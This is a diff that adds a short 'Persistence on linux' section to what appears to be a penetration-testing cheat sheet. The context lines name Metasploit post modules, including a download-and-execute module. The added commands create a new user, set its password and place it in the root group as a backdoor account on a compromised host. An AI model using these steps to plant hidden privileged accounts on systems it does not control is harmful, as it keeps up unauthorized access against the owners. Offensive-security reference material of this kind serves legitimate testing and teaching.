@@ -525,6 +525,34 @@ post/multi/manage/system_session
 post/linux/manage/download_exec
 ```
 
+## Persistence on linux
+
+### First method via ssh
+
+
+Make a user and its password using 
+
+```bash
+useradd -m (username)
+```
+and password using
+
+```bash
+passwd (username)
+```
+then give the account root privilleg if you are already a root user using 
+
+```bash
+usermod -aG root (username)   
+```
+
+
+
+
+
+
+
+
 
 
 
